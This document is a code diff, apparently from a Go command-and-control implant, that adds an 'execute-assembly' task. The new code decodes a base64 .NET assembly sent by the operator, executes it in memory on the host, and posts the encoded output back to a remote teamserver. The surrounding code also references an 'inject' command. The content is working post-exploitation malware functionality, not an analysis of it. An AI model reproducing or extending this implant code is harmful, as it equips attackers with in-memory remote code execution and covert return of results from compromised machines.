@@ -401,6 +401,54 @@ func main() {
 
 			fmt.Println("[*] Results sent successfully")
 		
+		case "execute-assembly":
+			fmt.Println("[!] Found 'execute-assembly', executing .NET assembly in memory now...")
+			fmt.Println("[!] Execute-Assembly Args: " + strings.Join(command_args, " "))
+			command_id := task["CommandID"].(string)
+			raw_bytes, err := b64_decode(command_args[0])
+			if err != nil {
+				fmt.Println("[!] Error decoding base64 encoded assembly")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Assembly length:", len(raw_bytes))
+
+			res, err := execute_assembly(raw_bytes)
+			if err != nil {
+				fmt.Println("[!] Error executing assembly")
+				fmt.Println(err)
+				return
+			}
+
+			result := b64_encode([]byte(res))
+
+			result_struct := TaskResult{
+				CommandID: command_id,
+				Result:    result,
+			}
+
+			jsonResult, err := json.Marshal(result_struct)
+			if err != nil {
+				fmt.Println("[!] Error marshalling result")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Sending results to teamserver...")
+			fmt.Println(string(jsonResult))
+
+			_, err = post_results(agent, PostResult, jsonResult, command_id)
+
+			if err != nil {
+				fmt.Println("[!] Error posting results")
+				fmt.Println(err)
+				return
+			}
+
+			fmt.Println("[*] Results sent successfully")
+
+		
 		case "inject":
 			fmt.Println("[*] Found 'inject', executing command")
 			fmt.Println("[*] Inject Args: " + strings.Join(command_args, " "))
